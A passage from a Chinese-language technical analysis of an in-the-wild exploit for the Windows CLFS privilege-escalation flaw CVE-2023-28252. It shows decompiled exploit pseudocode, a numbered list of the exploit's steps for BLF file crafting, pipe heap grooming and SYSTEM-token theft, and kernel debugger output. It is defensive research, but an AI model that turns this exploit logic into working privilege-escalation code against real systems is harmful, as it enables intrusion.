ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001308</span>]<span style="color:#f92672">=</span> SeSetAccessStateGenericMappingAddressKernelAddr;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> v80<span style="color:#f92672">=</span><span style="color:#ae81ff">90</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">NtFsControlFileAddress</span>(hReadPipe[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64, v91,<span style="color:#ae81ff">0x110038</span>,<span style="color:#f92672">&amp;</span>v80,<span style="color:#ae81ff">2</span>, v57,<span style="color:#ae81ff">0x2000</span>);</span></span><span style="display:flex;"><span> v60<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)system_token_object<span style="color:#f92672">+</span> (<span style="color:#66d9ef">__int64</span>)token_offset;</span></span><span style="display:flex;"><span> v61<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v60<span style="color:#f92672">+</span> v57<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v60<span style="color:#f92672">+</span> v57)<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x8181818181818181u</span>i64 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v59<span style="color:#f92672">>=</span><span style="color:#ae81ff">0xA</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_76;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0xFFFFFFFF</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v60<span style="color:#f92672">+</span> v57);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x100000007</span>]<span style="color:#f92672">=</span> v61;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000448</span>]<span style="color:#f92672">=</span> current_token<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0xFFFFFFFF</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1470</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x100000007</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000448</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">912</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span></code></pre></div><p>从这段代码可以明显看到CVE-2022-37969利用的影子，包括布局0x5000000内存，疑似伪造CClfsContainer对象，利用ClfsEarlierLsn、SeSetAccessStateGenericMappingAddress进行任意地址读写，不同的是本次样本中增加了ClfsMgmtDeregisterManagedClient和PoFxProcessorNotification函数。同时和CVE-2022-37969一样的是两次触发了漏洞，分别读取system token和将system token写入到自身token，达成提权。</p><p>同时还注意到，样本集成了利用RtlClearBit进行提权的技术，由一个全局flag控制决定使用哪种方式，其while循环内逻辑和前一种利用方式一样。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v63<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v64<span style="color:#f92672">=</span> hObject;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">AddLogContainer</span>(<span style="color:#f92672">*</span>v64,<span style="color:#f92672">&amp;</span>pcbContainer, (LPWSTR)<span style="color:#f92672">&amp;</span>v97[<span style="color:#ae81ff">256</span><span style="color:#f92672">*</span> (<span style="color:#66d9ef">__int64</span>)v63],<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000000</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x5001000</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000030</span>]<span style="color:#f92672">=</span> qword_7FF662B44710;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001008</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011F8</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001000</span>]<span style="color:#f92672">=</span> ClfsMgmtDeregisterManagedClientAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001028</span>]<span style="color:#f92672">=</span> RtlClearBitKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000008</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> v65<span style="color:#f92672">=</span> system_TOKEN;</span></span><span style="display:flex;"><span> system_token_object<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v66<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">size_t</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> v67<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v66</span>(v67,<span style="color:#f92672">&amp;</span>system_token_object, v65,<span style="color:#ae81ff">8</span>i64, v88);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( system_token_object<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x8181818181818181u</span>i64 )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v63<span style="color:#f92672">>=</span><span style="color:#ae81ff">0xA</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_88;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v68<span style="color:#f92672">=</span> current_token;</span></span><span style="display:flex;"><span> Size<span style="color:#f92672">=</span> system_token_object;</span></span><span style="display:flex;"><span> v69<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">size_t</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);<span style="color:#75715e">// NtWriteVirtualMemory</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v70<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v69</span>(v70, v68,<span style="color:#f92672">&amp;</span>Size,<span style="color:#ae81ff">8</span>i64, v89);</span></span><span style="display:flex;"><span> v71<span style="color:#f92672">=</span> MyLog__08d_base_block;</span></span><span style="display:flex;"><span> v83<span style="color:#f92672">=</span><span style="color:#ae81ff">5232</span>;</span></span><span style="display:flex;"><span> v72<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> v73<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v72</span>(v73, v71<span style="color:#f92672">+</span><span style="color:#ae81ff">920</span>,<span style="color:#f92672">&amp;</span>v83,<span style="color:#ae81ff">4</span>i64, v90);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LOBYTE</span>(v80)<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> v74<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span>);</span></span><span style="display:flex;"><span> v75<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> v76<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v75</span>(v76, v74,<span style="color:#f92672">&amp;</span>v80,<span style="color:#ae81ff">1</span>i64, v91);</span></span><span style="display:flex;"><span>LABEL_88:</span></span><span style="display:flex;"><span>.....</span></span><span style="display:flex;"><span> v77<span style="color:#f92672">=</span> v98;</span></span></code></pre></div><p>总结样本利用步骤</p><ol><li>创建一个主blf日志文件，并修改特定偏移的值，而后调用AddLogContainer为其添加容器</li><li>调用CreateLogFIle创建十个用于堆布局的副BLF日志文件，并修改特定偏移的值。</li><li>分别生成0x5000和0x4000对pipe，首先对0x5000对pipe调用WriteFile写入主blf文件的base block地址+0x30，而后从0x1000对开始释放0x667对pipe，而后调用CreateLogFile，传入的文件名为第二步所用的副blf文件名。</li><li>为0x4000对pipe调用WriteFile写入内存，和第三步中写入的一样。</li><li>为前面十个副blf文件添加容器。</li><li>对主blf日志文件调用CreateLogFile，触发漏洞，一共触发两次，分别完成token的读写。</li></ol><p><strong>动态调试</strong></p><p>使用x64dbg调试样本，并使用windbg附加内核调试。在x64dbg中可以看到，样本获取到了system token和自身token地址。</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.assets/1.png"/></p><p>在windbg中可以看到已经成功获取到了自身token地址和system token地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1: kd> !process 16e0 1</span></span><span style="display:flex;"><span>Searching for Process with Cid == 16e0</span></span><span style="display:flex;"><span>PROCESS ffffcf8bfa9dd180</span></span><span style="display:flex;"><span> SessionId: 1 Cid: 16e0 Peb: 2b65a98000 ParentCid: 1cf4</span></span><span style="display:flex;"><span>FreezeCount 1</span></span><span style="display:flex;"><span> DirBase: a9197000 ObjectTable: ffffa80486c39280 HandleCount: 171.</span></span><span style="display:flex;"><span> Image: 06248628e1ede80fcc3c36b25.exe</span></span><span style="display:flex;"><span> VadRoot ffffcf8bfaac8ab0 Vads 86 Clone 0 Private 2360. Modified 5134. Locked 0.</span></span><span style="display:flex;"><span> DeviceMap ffffa80480c82af0</span></span><span style="display:flex;"><span> Token ffffa80486595060</span></span><span style="display:flex;"><span> ElapsedTime 00:14:19.644</span></span><span style="display:flex;"><span> UserTime 00:00:00.000</span></span><span style="display:flex;"><span> KernelTime 00:00:00.000</span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool] 195352</span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool] 12024</span></span><span style="display:flex;"><span> Working Set Sizes (now,min,max) (5527, 50, 345) (22108KB, 200KB, 1380KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize 5447</span></span><span style="display:flex;"><span> VirtualSize 4247 Mb</span></span><span style="display:flex;"><span> PeakVirtualSize 4247 Mb</span></span><span style="display:flex;"><span> PageFaultCount 12131</span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority 8</span></span><span style="display:flex;"><span> CommitCharge 3956</span></span><span style="display:flex;"><span> DebugPort ffffcf8bf58da970</span></span><span style="display:flex;"><span> Job ffffcf8bf5fd5060</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1: kd> dq FFFFCF8BFA9DD638</span></span><span style="display:flex;"><span>ffffcf8b`fa9dd638 ffffa804`86595064 00000000`00000000</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1: kd> !process 4 1</span></span><span style="display:flex;"><span>Searching for Process with Cid == 4</span></span><span style="display:flex;"><span>PROCESS ffffcf8bf1695040</span></span><span style="display:flex;"><span> SessionId: none Cid: 0004 Peb: 00000000 ParentCid: 0000</span></span><span style="display:flex;"><span> DirBase: 001ad000 ObjectTable: ffffa8047c03ddc0 HandleCount: 2771.</span></span><span style="display:flex;"><span> Image: System</span></span><span style="display:flex;"><span> VadRoot ffffcf8bf1dd2da0 Vads 6 Clone 0 Private 22. Modified 335861. Locked 0.</span></span><span style="display:flex;"><span> DeviceMap ffffa8047c0351e0</span></span><span style="display:flex;"><span> Token ffffa8047c04f6e0</span></span><span style="display:flex;"><span> ElapsedTime 2 Days 23:05:23.432</span></span><span style="display:flex;"><span> UserTime 00:00:00.000</span></span><span style="display:flex;"><span> KernelTime 00:07:35.203</span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool] 0</span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool] 272</span></span><span style="display:flex;"><span> Working Set Sizes (now,min,max) (24, 50, 450) (96KB, 200KB, 1800KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize 218</span></span><span style="display:flex;"><span> VirtualSize 3 Mb</span></span><span style="display:flex;"><span> PeakVirtualSize 14 Mb</span></span><span style="display:flex;"><span> PageFaultCount 3280</span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority 8</span></span><span style="display:flex;"><span> CommitCharge 49</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1: kd> dq ffffcf8bf16954f8</span></span><span style="display:flex;"><span>ffffcf8b`f16954f8 ffffa804`7c04f6e3 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695508 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695518 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695528 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695538 00000000`00000016 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695548 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695558 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>ffffcf8b`f1695568 00000000`5333eb49 00000000`00000000</span></span></code></pre></div><p>而后获取到了各个内核函数地址</p><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/2.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1: kd> u FFFFF80634782B20</span></span><span style="display:flex;"><span>CLFS!ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff806`34782b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff806`34785338)]</span></span><span style="display:flex;"><span>fffff806`34782b27 4885c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff806`34782b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62)</span></span><span style="display:flex;"><span>fffff806`34782b2c 488b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff806`34782b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff806`34784ec0)]</span></span><span style="display:flex;"><span>fffff806`34782b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62)</span></span><span style="display:flex;"><span>fffff806`34782b38 483bc8 cmp rcx,rax</span></span><span style="display:flex;"><span>fffff806`34782b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff806`34782b62)</span></span></code></pre></div><p>在获取到主blf日志文件的base block后通过writefile写入匿名pipe</p><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/3.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db FFFFA80488303000</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303000</span><span style="color:#ae81ff">15</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#ae81ff">3</span>d<span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....<span style="color:#f92672">=</span>.<span style="color:#f92672">=</span>.........</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303010</span><span style="color:#ae81ff">02</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff ................</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303020</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ff ff ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">70</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........p.......</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303030</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303040</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303050</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">69</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........i.......</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303060</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">80</span><span style="color:#ae81ff">79</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .........y......</span></span><span style="display:flex;"><span>ffffa804<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">88303070</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">80</span><span style="color:#ae81ff">11</span><span style="color:#ae81ff">28</span><span style="color:#ae81ff">07</span><span style="color:#ae81ff">7</span>e<span style="color:#ae81ff">19</span> ee<span style="color:#ae81ff">11</span> ..........(.<span style="color:#f92672">~</span>...</span></span></code></pre></div><p>由于不知道样本修改的文件中哪个部分起到了关键性作用，此时由果追溯原因，样本在伪造的CClfsContainer对象中布局了ClfsEarlierLsn函数地址，在CVE-2022-37969中已经知道该函数是触发漏洞的关键性函数，在ClfsEarlierLsn函数断点，继续运行，调试器断下，此时调用栈如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> k</span></span><span style="display:flex;"><span> # Child-SP RetAddr Call Site</span></span><span style="display:flex;"><span>00 ffffa00a`59414fb8 fffff800`53141ba6 CLFS!ClfsEarlierLsn</span></span><span style="display:flex;"><span>01 ffffa00a`59414fc0 fffff800`531337e8 CLFS!ClfsMgmtDeregisterManagedClient+0x46</span></span><span style="display:flex;"><span>02 ffffa00a`59414ff0 fffff800`5310307f CLFS!CClfsBaseFilePersisted::CheckSecureAccess+0x174</span></span><span style="display:flex;"><span>03 ffffa00a`594150b0 fffff800`53101bf9 CLFS!CClfsLogFcbPhysical::CheckSecureAccess+0x1f</span></span><span style="display:flex;"><span>04 ffffa00a`59415100 fffff800`531310c3 CLFS!CClfsLogFcbPhysical::Initialize+0x15d</span></span><span style="display:flex;"><span>05 ffffa00a`59415240 fffff800`53132b1b CLFS!CClfsRequest::Create+0x4ef</span></span><span style="display:flex;"><span>06 ffffa00a`59415390 fffff800`531328e7 CLFS!CClfsRequest::Dispatch+0x97</span></span><span style="display:flex;"><span>07 ffffa00a`594153e0 fffff800`53132837 CLFS!ClfsDispatchIoRequest+0x87</span></span><span style="display:flex;"><span>08 ffffa00a`59415430 fffff800`55c954d5 CLFS!CClfsDriver::LogIoDispatch+0x27</span></span><span style="display:flex;"><span>09 ffffa00a`59415460 fffff800`55c96ad4 nt!IofCallDriver+0x55</span></span><span style="display:flex;"><span>0a ffffa00a`594154a0 fffff800`560a775d nt!IoCallDriverWithTracing+0x34</span></span><span style="display:flex;"><span>0b ffffa00a`594154f0 fffff800`5608f68e nt!IopParseDevice+0x117d</span></span><span style="display:flex;"><span>0c ffffa00a`59415660 fffff800`560ba3da nt!ObpLookupObjectName+0x3fe</span></span><span style="display:flex;"><span>0d ffffa00a`59415830 fffff800`560c999f nt!ObOpenObjectByNameEx+0x1fa</span></span><span style="display:flex;"><span>0e ffffa00a`59415960 fffff800`560c9579 nt!IopCreateFile+0x40f</span></span><span style="display:flex;"><span>0f ffffa00a`59415a00 fffff800`55e0d8f5 nt!NtCreateFile+0x79</span></span><span style="display:flex;"><span>10 ffffa00a`59415a90 00007ffd`9160db64 nt!KiSystemServiceCopyEnd+0x25</span></span><span style="display:flex;"><span>11 00000077`5eafb898 00007ffd`8c382199 ntdll!NtCreateFile+0x14</span></span><span style="display:flex;"><span>12 00000077`5eafb8a0 00007ff7`ecad416a clfsw32!CreateLogFile+0x679</span></span><span style="display:flex;"><span>13 00000077`5eafba40 00007ff7`ecad461c 0624fbfa7618628e1ede80fcc3c36b25+0x416a</span></span><span style="display:flex;"><span>14 00000077`5eaffca0 00007ffd`900c7614 0624fbfa7618628e1ede80fcc3c36b25+0x461c</span></span><span style="display:flex;"><span>15 00000077`5eaffce0 00007ffd`915c26a1 KERNEL32!BaseThreadInitThunk+0x14</span></span><span style="display:flex;"><span>16 00000077`5eaffd10 00000000`00000000 ntdll!RtlUserThreadStart+0x21</span></span></code></pre></div><p>样本中对应的伪代码如下，在调用CreateLogFile时触发了漏洞，调用ClfsEarlierLsn函数。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>MEMORY[<span style="color:#ae81ff">0x50011E0</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011E8</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011F0</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011F8</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001000</span>]<span style="color:#f92672">=</span> ClfsMgmtDeregisterManagedClientAddress;</span></span><span style="display:flex;"><span> 